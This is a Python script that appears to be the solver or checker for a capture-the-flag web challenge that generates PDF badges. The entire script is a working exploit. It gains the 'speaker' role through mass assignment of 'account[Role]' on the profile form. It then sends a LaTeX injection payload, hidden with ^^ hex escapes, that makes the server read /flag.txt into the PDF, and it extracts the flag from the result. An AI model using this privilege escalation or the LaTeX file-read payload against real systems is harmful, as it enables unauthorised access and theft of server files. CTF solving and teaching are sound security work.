#!/usr/bin/env python3

import io
import requests
import sys
import os
import re

from pypdf import PdfReader


HOST = os.getenv("HOST", "entrypass.challs.srdnlen.it")
PORT = int(os.getenv("PORT", 443))
BASE_URL = f"https://{HOST}:{PORT}"

FLAG_RE = re.compile(r"srdnlen\{[^}]*\}")
TIMEOUT = 3

PAYLOAD = r"^^7d^^5cVerbatim^^49nput^^7b/^^66lag.txt^^7d^^5ctextbf^^7b"



def _extract_flag(pdf_bytes):
    m = FLAG_RE.search(pdf_bytes.decode("latin-1"))
    if m:
        return m.group()
    try:
        reader = PdfReader(io.BytesIO(pdf_bytes))
        text = "".join(page.extract_text() or "" for page in reader.pages)
    except Exception:
        return None
    m = FLAG_RE.search(text)
    return m.group() if m else None



sess = requests.Session()

username = "chk_" + os.urandom(4).hex()
password = "checkerpw123"

sess.post(f"{BASE_URL}/register", data={
    "username": username, "first_name": "Ada", "last_name": "Lovelace",
    "password": password, "confirm": password,
}, timeout=TIMEOUT, allow_redirects=True)

sess.post(f"{BASE_URL}/profile", data={"account[Role]": "speaker"}, timeout=TIMEOUT, allow_redirects=True)

home = sess.get(f"{BASE_URL}/", timeout=30).text
if "as speaker" not in home.lower():
    print("[!] privesc to speaker failed", file=sys.stderr)
    exit(1)

res = sess.post(f"{BASE_URL}/generate", data={
    "first_name": "Ada", "last_name": "Lovelace", "nickname": username,
    "talk_title": PAYLOAD, "talk_abstract": "",
}, timeout=60)

if res.headers.get("Content-Type", "").split(";")[0] != "application/pdf":
    print("[!] /generate did not return a PDF", file=sys.stderr)
    exit(1)

flag = _extract_flag(res.content)
if not flag:
    print("[!] flag not found in generated PDF", file=sys.stderr)
    exit(1)

print(flag)
exit(0)
